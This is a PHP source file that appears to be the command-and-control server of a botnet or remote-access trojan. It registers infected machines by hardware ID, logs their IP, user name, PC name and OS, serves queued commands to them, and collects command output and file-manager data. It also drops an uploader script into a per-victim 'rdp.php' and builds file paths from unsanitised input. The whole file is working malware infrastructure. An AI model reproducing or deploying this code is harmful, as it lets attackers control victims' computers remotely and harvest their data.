<?php
    if (isset($_REQUEST['action'])) {
        if ($_REQUEST['action'] == "cad") {
            $hwid = $_REQUEST['hwid'];
            $Ip = $_REQUEST['Ip'];
            $User = $_REQUEST['User'];
            $Pc = $_REQUEST['Pc'];
            $Os = $_REQUEST['Os'];
            $DataeHora = $_REQUEST['DataeHora'];
            if (is_dir("Users/".$hwid)) {
                if (is_file("Users/".$hwid."/info.txt")) {
                    file_put_contents("Users/".$hwid."/info.txt", "");
                }
                $fopen = fopen("Users/".$hwid."/info.txt", "a");
                fwrite($fopen, $hwid."|".$Ip."|".$User."|".$Pc."|".$Os."|".$DataeHora);
                fclose($fopen);
                if (is_file("Users/".$hwid."/cmd.txt")) {
                    $fopen = fopen("Users/".$hwid."/cmd.txt", "a");
                    fclose($fopen);
                }
                if (is_file("Users/".$hwid."/rdp.php")) {
                    $fopen = fopen("Users/".$hwid."/rdp.php", "a");
                    fwrite($fopen,file_get_contents("uploader.php"));
                    fclose($fopen);
                }                     
                die("OK");
            } else {
                mkdir("Users/".$hwid);
                $fopen = fopen("Users/".$hwid."/info.txt", "a");
                fwrite($fopen, $hwid."|".$Ip."|".$User."|".$Pc."|".$Os."|".$DataeHora);
                fclose($fopen);
                $fopen = fopen("Users/".$hwid."/cmd.txt", "a");
                fclose($fopen);
                $fopen = fopen("Users/".$hwid."/rdp.php", "a");
                fwrite($fopen,file_get_contents("uploader.php"));
                fclose($fopen);             
                die("OK");
            }
        } else if ($_REQUEST['action'] == "cmd") {
            $hwid = $_REQUEST['hwid'];
            if (is_dir("Users/".$hwid)) {
                if (is_file("Users/".$hwid."/cmd.txt")) {
                    $comandos = file_get_contents("Users/".$hwid."/cmd.txt");
                    file_put_contents("Users/".$hwid."/cmd.txt", "");
                    die($comandos);
                }
            }
        }  else if ($_REQUEST['action'] == "out") {
            $hwid = $_REQUEST['hwid'];
            $output = $_REQUEST['out'];
            if (is_dir("Users/".$hwid)) {
                if (is_file("Users/".$hwid."/out.txt")) {
                    file_put_contents("Users/".$hwid."/out.txt", "");
                }
                    $fopen = fopen("Users/".$hwid."/out.txt", "a");
                    fwrite($fopen, $output);
                    fclose($fopen);
                    die("Ok");
            }
        }  else if ($_REQUEST['action'] == "flm") {
            $hwid = $_REQUEST['hwid'];
            $dados = $_REQUEST['flm'];
            if (is_dir("Users/".$hwid)) {
                if (is_file("Users/".$hwid."/flm.txt")) {
                    file_put_contents("Users/".$hwid."/flm.txt", "");
                }
                    $fopen = fopen("Users/".$hwid."/flm.txt", "a");
                    fwrite($fopen, $dados);
                    fclose($fopen);
                    die("Ok");
            }
        }
    }
    // http://localhost/treinamento/bot.php?action=cad  (CADASTRAR)
    // http://localhost/treinamento/bot.php?action=cmd  (COMANDOS)
    // http://localhost/treinamento/bot.php?action=out  (COMANDOS)
?>